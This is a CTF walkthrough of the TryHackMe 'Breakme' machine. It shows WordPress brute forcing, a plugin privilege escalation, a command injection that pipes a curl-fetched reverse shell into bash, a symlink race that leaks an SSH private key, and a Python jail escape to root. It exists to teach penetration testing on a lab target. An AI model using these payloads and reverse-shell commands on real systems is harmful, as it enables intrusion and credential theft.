---
title: CTF Walkthrough for TryHackMe Machine Breakme
date: 2024-09-27 00:00:00 +0300
categories: [Walkthrough, CTF]
tags: [TryHackMe, Writeup, Command Injection, WordPress, Reverse Engineering]   
image:
  path: /assets/img/posts/walthrough/tryhackme/2024-09-27-breakme/box-breakme.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about Breakme a TryHackMe machine. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
### Machine Description
Name: Breakme<br>
Difficulty: Medium<br>
Operating System: Linux<br>
Machine link: [Breakme](https://tryhackme.com/r/room/breakmenu)<br>
### Tools used
1) Nmap<br>
2) ffuf<br>
3) Zaproxy<br>
4) Chisel<br>
5) Cutter<br>
6) Wpscan<br>

## Reconnaissance

We will start by performing a service scan on the target to enumerate services running on open ports.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Breakme/Scans/Service]
└─$ sudo nmap -n 10.10.64.230 -sV -sC -oN service-scan.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-26 19:03 BST
Nmap scan report for 10.10.64.230
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 8e:4f:77:7f:f6:aa:6a:dc:17:c9:bf:5a:2b:eb:8c:41 (RSA)
|   256 a3:9c:66:73:fc:b9:23:c0:0f:da:1d:c9:84:d6:b1:4a (ECDSA)
|_  256 6d:c2:0e:89:25:55:10:a9:9e:41:6e:0d:81:9a:17:cb (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.56 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.24 seconds  
```

The target runs a web server and an SSH server. In our scan result we can see that the index page of the root directory is the default Apache index page so, let's fuzz the web application to discover hidden directories.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Breakme/Scans/Web]
└─$ ffuf -ic -c -u http://10.10.64.230/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.txt.html

<SNIP>
                        [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 308ms]
.php                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 2805ms]
wordpress               [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 97ms]
manual                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 248ms]
.php                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 96ms]
                        [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 93ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 98ms]
:: Progress: [661638/661638] :: Job [1/1] :: 414 req/sec :: Duration: [0:28:55] :: Errors: 0 ::
```

The result above shows us an interesting directory i.e. wordpress, this may tell us that our target runs WordPress CMS. We can confirm our assumption by visiting this directory.
![](/assets/img/posts/walthrough/tryhackme/2024-09-27-breakme/1-browse.png)

We can see that our target's web application indeed uses the WordPress CMS. We can start a quick enumeration of the target WordPress instance by enumerating vulnerable plugins.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Breakme/Scans/Web]               
└─$ wpscan --url http://10.10.64.230/wordpress/ -e vp        
<SNIP>
[i] Plugin(s) Identified:

[+] wp-data-access
 | Location: http://10.10.64.230/wordpress/wp-content/plugins/wp-data-access/
 | Last Updated: 2024-09-18T00:01:00.000Z
 | [!] The version is out of date, the latest version is 5.5.14
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 5.3.5 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.64.230/wordpress/wp-content/plugins/wp-data-access/readme.txt

<SNIP>
[+] Elapsed time: 00:00:15
```

This enumeration shows that the WordPress instance uses an outdated version of the wp-data-access plugin. Version 5.3.5 used by our target is vulnerable to a privilege escalation vulnerability.
![](/assets/img/posts/walthrough/tryhackme/2024-09-27-breakme/vuln-discovery.png)

## Exploitation

This vulnerability requires us to have an account on the targeted WordPress instance. For this reason, we need to find valid user credentials to log into the WordPress instance. We can do this by first enumerating valid usernames.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Breakme/Scans/Web]                           
└─$ wpscan --url http://10.10.64.230/wordpress/ -e u  
<SNIP>

[+] Enumerating Users (via Passive and Aggressive Methods) 
 Brute Forcing Author IDs - Time: 00:00:02 <===============================================================================================================> (10 / 10) 100.00% Time: 00:00:02                
[i] User(s) Identified:   
[+] admin                                                 
 | Found By: Author Posts - Author Pattern (Passive Detection)                   
 | Confirmed By:                                          
<NIP>                               
[+] bob                                                                
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)     
 | Confirmed By: Login Error Messages (Aggressive Detection)                     
<SNIP>                        
[+] Elapsed time: 00:00:09                 
```

The enumeration was successful and we found two valid usernames. We can attempt a password brute force attack using these usernames. 
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Breakme/Scans/Web]
└─$ echo "bob\nadmin" > ../../Misc\ File/usernames.txt   

┌──(pentester㉿kali)-[~/…/TryHackMe/Breakme/Scans/Web]
└─$wpscan -U ../../Misc\ File/usernames.txt -P /usr/share/wordlists/seclists/Passwords/probable-v2-top207.txt --url http://10.10.64.230/wordpress/ 
<SNIP>

[+] Performing password attack on Wp Login against 2 user/s
[SUCCESS] - bob / <REDACTED>

Trying admin / casper Time: 00:00:17 <=======================================================================                                             > (347 / 554) 62.63%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: bob, Password: <REDACTED>

<SNIP>
[+] Memory used: 265.699 MB
[+] Elapsed time: 00:00:26     
```

The password brute force attack was successful and we have obtained Bob's password. we can use this password to log into the WordPress instance.
![](/assets/img/posts/walthrough/tryhackme/2024-09-27-breakme/wordpress-login.png){: .center}
![](/assets/img/posts/walthrough/tryhackme/2024-09-27-breakme/after-login.png)

This account appears to be a low privilege account and we can do anything with this. Remember above that the target uses the vulnerable version of the wp-data-access plugin that can allow us to escalate our privileges. This [article](https://www.wordfence.com/blog/2023/04/privilege-escalation-vulnerability-patched-promptly-in-wp-data-access-wordpress-plugin/) explains the nature of the vulnerability. To exploit this vulnerability, we can click on Bob's profile picture on the top right corner of the dashboard page and select update. Now, we need to set our proxy to intercept mode and click the update button at the bottom of the profile.php page. We can now add the wpda_role[] parameter and give it the administrator value. This will grant us admin privileges on the website.
![](/assets/img/posts/walthrough/tryhackme/2024-09-27-breakme/vuln-exploit.png)

After modifying the POST request we can send it and we will notice a change in Bob's panel. This change is because Bob's role has been upgraded to that of an administrator.
![](/assets/img/posts/walthrough/tryhackme/2024-09-27-breakme/vuln-exploit-proof.png)

Now that we have admin access to the website we can modify a theme's page by adding a reverse shell payload to it. We can add this payload to an unused theme e.g. twentytwentythree in his case.
![](/assets/img/posts/walthrough/tryhackme/2024-09-27-breakme/theme-change.png)

We then need to start a listener on our attack host and access the page that contains our payload to trigger its execution.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
```
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Breakme/Scans/Web]
└─$ curl http://10.10.64.230/wordpress/wp-content/themes/twentytwentythree/patterns/hidden-404.php
```

When we return to our listener we will notice a reverse connection from the target. We can upgrade this shell to a fully interactive shell to facilitate our enumeration.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.8.23.19] from (UNKNOWN) [10.10.64.230] 38510
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")' 
<ress/wp-content/themes/twentytwentythree/patterns$ ^Z
zsh: suspended  nc -lvnp 1234


┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1234
                               export TERM=xterm
www-data@Breakme:/var/www/html/wordpress/wp-content/themes/twentytwentythree/patterns$ 
```
Now, we have a foothold on the target and we can use this to enumerate the target further. If we look at the ports listening internally on the target, we will notice an uncommon port listener to the internal IP 127.0.0.1.
```bash
www-data@Breakme:/tmp$ netstat -nlt
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:9999          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN  
```

To enumerate this port, we can transfer Chisel and pspy64 to the target. To do this, we first need to start a Python server in the directory where these binaries are located.
```bash
┌──(pentester㉿kali)-[/opt]
└─$ ls -l
<SNIP>
-rwxr-xr-x 8 root root    4096 Sep 24 16:49 pspy64
-rw-r--r-- 1 root root 8654848 Aug 20  2023 chisel

┌──(pentester㉿kali)-[/opt]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

We can now use wget on the target to download this binary from our attack host.
```bash
www-data@Breakme:/tmp$ wget 10.8.23.19/chisel
--2024-09-26 17:30:37--  http://10.8.23.19/chisel; chmod 755 chisel             
2024-09-26 17:30:41 (2.26 MB/s) - ‘chisel’ saved [8654848/8654848]
<SNIP>

www-data@Breakme:/tmp$ wget 10.8.23.19/pspy64; chmod 755 pspy64
--2024-09-26 23:33:08--  http://10.8.23.19/pspy64
<SNIP>    
2024-09-26 23:33:12 (1008 KB/s) - ‘pspy64’ saved [3104768/3104768]
```

We can now run Chisel on our target using the server option in the background and run pspy64 to track the server's execution flow.
```bash
www-data@Breakme:/tmp$ ./chisel server -p 4444 &
[1] 1417
www-data@Breakme:/tmp$ 2024/09/26 23:34:53 server: Fingerprint acOc0jhUsJnFUCyfbA1YF9Z5aPDK01T2iw450PPmRJ8=
2024/09/26 23:34:53 server: Listening on http://0.0.0.0:4444
www-data@Breakme:/tmp$./pspy64  
```

On our attack host, we need to run Chisel with the client option to connect to Chisel's server running on the target. This setup will route all traffic sent to our local port 9999 to the target port 9999 listening on 127.0.0.1.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Breakme/Scans/Web]
└─$ chisel client 10.10.230.208:4444 9999:127.0.0.1:9999
2024/09/27 04:13:58 client: Connecting to ws://10.10.230.208:4444
2024/09/27 04:13:58 client: tun: proxy#9999=>9999: Listening
2024/09/27 04:14:00 client: Connected (Latency 307.622434ms)
```

Now that our local port 9999 routes traffic to the target port 9999 listening on the internal IP address, we can conduct a service scan on our local port to enumerate the service running on this particular port.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme]
└─$ nmap -sV -sC  127.0.0.1 -p9999
<SNIP>
PORT     STATE SERVICE VERSION
9999/tcp open  http    PHP cli server 5.5 or later (PHP 7.4.33)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Test

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 215.82 seconds
```

A web server appears to listen on this port. We can access this web application from our browse.
![](/assets/img/posts/walthrough/tryhackme/2024-09-27-breakme/2-browse.png)

This web application helps in checking an IP address, the existence of a user, and the existence of a file. Upon entering values to each of these fields, we will notice that our input is been used in executing special commands on the system. This can be seen with the help of pspy64 we ran earlier.
When we enter an IP address to check we will see that the IP address is checked with the ping command.
```bash
2024/09/26 23:35:54 CMD: UID=1002  PID=1430   | /usr/bin/php -S 127.0.0.1:9999 
2024/09/26 23:35:54 CMD: UID=1002  PID=1431   | sh -c ping -c 2 127.0.0.1 >/dev/null 2>&1 & 
```
When we enter a username we will see that the username entered is checked with the id command.
```bash
2024/09/26 23:37:34 CMD: UID=1002  PID=1434   | /usr/bin/php -S 127.0.0.1:9999 
2024/09/26 23:37:34 CMD: UID=1002  PID=1435   | sh -c id john >/dev/null 2>&1 & 
```
Lastly, when we enter a file name we will see that the file name entered is checked with the find command.
```bash
2024/09/26 23:39:06 CMD: UID=1002  PID=1444   | /usr/bin/php -S 127.0.0.1:9999       
2024/09/26 23:39:06 CMD: UID=1002  PID=1445   | sh -c find /opt -name "filename" 2>/dev/null 
```

This tells us that our user input is used to run system commands on the target. We can start thinking of command injection and start investigating the web application with different payloads. We will notice that most of the injection payloads are filtered out but the | is passed without any problem. We can host a reverse shell on our attack host and execute it on the target using curl and bash. We first need to create the reverse shell file and start the Python HTTP server.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme/Misc File]
└─$ echo '/bin/sh -i >& /dev/tcp/10.8.23.19/4444 0>&1' > shell.sh

┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme/Misc File]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Now that we host the malicious shell on our attack host, we can start a listener on our attack host and send the payload to our target for execution.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

```payload
john|curl${IFS}10.8.23.19/shell.sh${IFS}|/bin/bash
```
![](/assets/img/posts/walthrough/tryhackme/2024-09-27-breakme/payload-sent.png)

If we return to our listener, we will notice a reverse connection from the target and this time have a connection as the user John. We can upgrade this shell to a fully interactive shell and read the user's flag as shown below.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.23.19] from (UNKNOWN) [10.10.230.208] 37170
/bin/sh: 0: can't access tty; job control turned off
$  python3 -c 'import pty; pty.spawn("/bin/bash")' 
john@Breakme:~/internal$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 4444
                               export TERM=xterm
john@Breakme:~$ ls
internal  user1.txt
```

We can use this account to further our enumeration of the target. We will notice that the local user Youcef home directory is in our group and that this directory contains the SUID bit set for the user Youcef. 
```
john@Breakme:/home$ ls -l
total 24
drwxr-xr-x 4 john   john  4096 Aug  3  2023 john
drwx------ 2 root   root 16384 Aug 17  2021 lost+found
drwxr-x--- 4 youcef john  4096 Aug  3  2023 youcef
john@Breakme:/home$ ls youcef
readfile <SNIP>
```

Since binary looks like a custom binary. Before running this binary we must first transfer it to our attack host. We can start a Python HTTP server in the directory where the readfile binary is found on the target and download the binary on our attack host using wget.
```bash
john@Breakme:/home/youcef$ python3 -m http.server
```

```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme/Misc File]
└─$ wget 10.10.64.230:8000/readfile
```

We can load this binary in Cutter and decompile it using the Ghidra decompiler.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme/Misc File]
└─$ cutter ./readfile&
```
![](/assets/img/posts/walthrough/tryhackme/2024-09-27-breakme/readfile-decompile.png)

```c
// WARNING: [rz-ghidra] Detected overlap for variable buf
// WARNING: [rz-ghidra] Detected overlap for variable var_1ch
// WARNING: [rz-ghidra] Detected overlap for variable var_28h

undefined8 main(int argc, char **argv, char **envp) {
    int32_t iVar1;
    undefined8 uVar2;
    int64_t iVar3;
    char **var_4d0h;
    char **path;
    uint64_t var_4bch;
    int64_t var_4a0h;
    char *ptr;
    int32_t var_28h;
    unsigned long fildes;
    unsigned long var_20h;
    uint32_t var_1ch;
    char *var_18h;
    char *var_10h;

    var_4bch._0_4_ = argc;

    if (argc == 2) {
        iVar1 = access(argv[1], 0);
        if (iVar1 == 0) {
            iVar1 = getuid();
            if (iVar1 == 0x3ea) {
                var_10h = (char *)strstr(argv[1], "flag");
                var_18h = (char *)strstr(argv[1], "id_rsa");
                lstat(argv[1], (void *)((int64_t)&var_4bch + 4));
                var_1ch = (uint32_t)(((uint32_t)var_4a0h & 0xf000) == 0xa000);
                var_20h = access(argv[1], 4);
                usleep(0);

                if ((((var_10h == (char *)0x0) && (var_1ch == 0)) && 
                      (var_20h != 0xffffffff)) && 
                     (var_18h == (char *)0x0)) {
                    puts("I guess you won!\n");
                    fildes = open(argv[1], 0);
                    if ((int32_t)fildes < 0) {
                        __assert_fail("fd >= 0 && \"Failed to open the file\"", "readfile.c", 0x26, "main");
                    }
                    do {
                        var_28h = read(fildes, &ptr, 0x400);
                        if (var_28h < 1) break;
                        iVar3 = write(1, &ptr, (int64_t)var_28h);
                    } while (0 < iVar3);
                    uVar2 = 0;
                } else {
                    puts("Nice try!");
                    uVar2 = 1;
                }
            } else {
                puts("You can't run this program");
                uVar2 = 1;
            }
        } else {
            puts("File Not Found");
            uVar2 = 1;
        }
    } else {
        puts("Usage: ./readfile <FILE>");
        uVar2 = 1;
    }
    
    return uVar2;
}
```

This code allows us to read a file after performing some checks. The most important checks are explained below.
1) The file should be a regular file i.e. not a symbolic link.
```c
lstat(argv[1], (void *)((int64_t)&var_4bch + 4));
var_1ch = (uint32_t)(((uint32_t)var_4a0h & 0xf000) == 0xa000);
```
2) The filename should not contain "flag".
4) The filename should not contain "id_rsa". 
```c
var_10h = (char *)strstr(argv[1], "flag");
var_18h = (char *)strstr(argv[1], "id_rsa");
if ((((var_10h == (char *)0x0) && (var_1ch == 0)) && 
      (var_20h != 0xffffffff)) && 
      (var_18h == (char *)0x0)) {
<SNIP>
}
```

In the code, we can see that the function ```usleep(0);``` is called after it has checked that the file is not a symbolic link and before it checks the content of the filename. This function even though not many lasts for a specific period. We can exploit this by creating two indefinite loops, one that creates a file, changes its state to a symbolic link pointing to Youcef's SSH private, and deletes the file indefinitely, and the second one that runs the program indefinitely. What this will do is that after the state of the normal file created has been verified, during the call of the sleep function the state of the file will be changed by our loop and the file will be read.
```bash
john@Breakme:/home/youcef$ while true;do touch ~/test;sleep 0.2;ln -sf /home/youcef/.ssh/id_rsa ~/test;sleep 0.2;rm ~/test;done&

john@Breakme:/home/youcef$ while true; do result=$(./readfile ~/test| grep -v "guess\|Found\|Failed"); [ -n "$result" ] && echo "$result"; done
-----BEGIN OPENSSH PRIVATE KEY-----                                      
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCGzrHvF6
Tuf+ZdUVQpV+cXAAAAEAAAAAEAAAILAAAAB3NzaC1yc2EAAAADAQABAAAB9QCwwxfZdy0Z           
<SNIP>
yHBxN27qpNoUHbrKHxLx4/UN4z3xcaabtC7BelMsu4RQ3rzGtLS9fhT5e0hoMP+eU3IvMB
g6a2xx9zV89mfWvuvrXDBX2VkdnvdvDHQRx+3SElSk1k3Votzw/q383ta6Jl3EC/1Uh8RT
TabCXd2Ji/Y7UvM=
-----END OPENSSH PRIVATE KEY-----    
```

We can see that after a short period, Youcef's private key is printed on the screen. Unfortunately, this key appears to have some problems when we try to connect with it.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme/Misc File]
└─$ ssh youcef@10.10.230.208 -i youcef_rsa
Load key "youcef_rsa": error in libcrypto
youcef@10.10.230.208's password: 
```

We can change the format of this key using ssh-keygen as a way around this issue.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme/Misc File]
└─$ ssh-keygen -p -f youcef_rsa -m PEM
Enter old passphrase:
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme/Misc File]
└─$ 
```

The key is protected by a passphrase. Let's use John the Ripper to extract the hashes of the password and crack it.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme/Misc File]
└─$ ssh2john youcef_rsa > ssh_has

┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme/Misc File]
└─$ john ssh_has -wordlist=/usr/share/worlists/rockyou.txt 
[ssh-opencl] cipher value of 6 is not yet supported with OpenCL!
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
<REDACTED>          (youcef_rsa)     
1g 0:00:00:12 DONE (2024-09-27 08:15) 0.08032g/s 56.55p/s 56.55c/s 56.55C/s sunshine1..nichole
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

After we have fixed the issue, we can now correct the format of Youcef's SSH key using the command below.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme/Misc File]
└─$ ssh-keygen -p -f youcef_rsa -m PEM
Enter old passphrase: 
Key has comment 'youcef@Breakme'
Enter new passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved with the new passphrase.    
```

Now, let's use this key to connect to the target using Youcef's key and read the second flag.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme/Misc File]
└─$ ssh youcef@10.10.230.208 -i youcef_rsa
Linux Breakme 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 (2021-08-03) x86_64
<SNIP>
Last login: Thu Mar 21 07:55:16 2024 from 192.168.56.1
youcef@Breakme:~$ ls .ssh
authorized_keys  id_rsa  user2.txt
```

## Post Exploitation

We can now enumerate the system using this account. The user Youcef appears to be able to run a Python script as the root user. We can see this by looking at Youcef's sudo rights.
```bash
youcef@Breakme:~$ sudo -l
Matching Defaults entries for youcef on breakme:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User youcef may run the following commands on breakme:
    (root) NOPASSWD: /usr/bin/python3 /root/jail.py
```

This script looks like the terminal version of the Python programming language but appears to filter everything we type.
```bash
youcef@Breakme:~$ sudo /usr/bin/python3 /root/jail.py
  Welcome to Python jail  
  Will you stay locked forever  
  Or will you BreakMe  
>> print('oasa')
oasa
>> a 
Wrong Input
>> print('os')  
Illegal Input

youcef@Breakme:~$ sudo /usr/bin/python3 /root/jail.py
  Welcome to Python jail  
  Will you stay locked forever 
  Or will you BreakMe  
>> print('OS'.lower())
Illegal Input
youcef@Breakme:~$
```

Words such as system, os, subprocess, import, lower, etc. are all filtered by this script. We can bypass this by using the __builtin__ module that contains built-in functions and objects. Python functions are passed to the __builtin__ module as strings, we can perform case manipulation with the help of the casefold() function which is not filtered by the script to bypass the filter and use OS instead of os. This can be used to read the shadow file as shown below.
```bash
youcef@Breakme:~$ sudo /usr/bin/python3 /root/jail.py
  Welcome to Python jail  
  Will you stay locked forever  
  Or will you BreakMe  
>> 
>> print('OS'.casefold())
os
>> print(__builtins__.__dict__['OPEN'.casefold()])
<built-in function open>
>> print(*file)
root:$y$j9T$DrCC/6peuPA6moD2I.f850$oMujKQSbqtMYZ/ZFQPLsfzWnXZ.hcJtHMRjksIqUgqA:19571:0:99999:7:::
<SNIP>
john:$y$j9T$F2iqohP1./v0gBs5Pj8Jw.$ZImaERRcmjCbG517uQF/o5TfYfOIzAIkhPU8ggxO9b6:19569:0:99999:7:::
youcef:$y$j9T$MpSx6u0o1TWZMfrD7Rq7e/$HOs8S70op1xqv2Hp5PU2nzheS8s1h4U5rh3YOSoUtc.:19570:0:99999:7:::
```

Cracking this password may be time-consuming for us, so let's use this same method to import the subprocess module and run a shell.
```bash
>> s=__builtins__.__dict__['__IMPORT__'.casefold()]('SUBPROCESS'.casefold())
>> s.run(['WHOAMI'.casefold()])
root
>> s.run(['BASH'.casefold()])
root@Breakme:/home/youcef# cd /root
root@Breakme:~# ls -la
total 52
drwx------  3 root root 4096 Mar 21  2024 .
drwxr-xr-x 18 root root 4096 Aug 17  2021 ..
lrwxrwxrwx  1 root root    9 Aug  3  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
-rwx------  1 root root 5438 Jul 31  2023 index.php
-rw-r--r--  1 root root 5000 Mar 21  2024 jail.py
-rw-r--r--  1 root root    0 Mar 21  2024 .jail.py.swp
-rw-------  1 root root   33 Aug  3  2023 .lesshst
drwxr-xr-x  3 root root 4096 Aug 17  2021 .local
-rw-------  1 root root 7575 Feb  4  2024 .mysql_history
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-------  1 root root   33 Aug  3  2023 .root.txt
root@Breakme:~# cat .root.txt
e257d58481412f8772e9fb9fd47d8ca4
```
We have successfully bypassed the filters and obtained a shell as the root user. We can use this access to read the third flag present on this machine.

## Conclusion

Congratulations! In this walkthrough, you have exploited a vulnerable WordPress plugin to elevate the compromised account to an administrator role, performed reverse engineering on a binary with SUID bit to exploit the binary's checks, and escaped a Python jail shell. This machine was designed to show how poor patching practices could seriously affect the security posture of an organisation. In a real-world assessment, the last step will be to gather our findings and draft a report for our clients. Thanks for following up on this walkthrough.
